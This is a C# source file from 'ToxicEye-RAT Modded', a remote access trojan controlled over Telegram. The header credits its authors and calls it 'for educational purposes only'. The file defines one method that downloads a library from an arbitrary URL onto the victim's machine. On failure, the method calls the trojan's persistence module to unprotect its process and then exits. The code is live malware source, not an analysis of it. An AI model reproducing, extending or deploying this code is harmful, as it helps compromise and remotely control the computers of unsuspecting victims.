/* 
       ^ Author    : LimerBoy && c0z3dc0
       ^ Name      : ToxicEye-RAT Modded
       ^ Github    : https://github.com/LimerBoy && https://github.com/c0z3dc0

       > This program is distributed for educational purposes only.
*/


using System;
using System.IO;
using System.Net;

namespace TelegramRAT
{
    internal sealed class coree
    {
        // Load dll
        public static void LoadRemoteLibrary(string url)
        {
            if (!File.Exists(Path.GetFileName(url)))
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadFile(url, Path.GetFileName(url));
                }
                catch (WebException)
                {
                    Console.Write("[!] Failed load libraries, not connected to internet!");
                    persistence.unprotectProcess();
                    Environment.Exit(1);
                }
            }
        }


    }
}
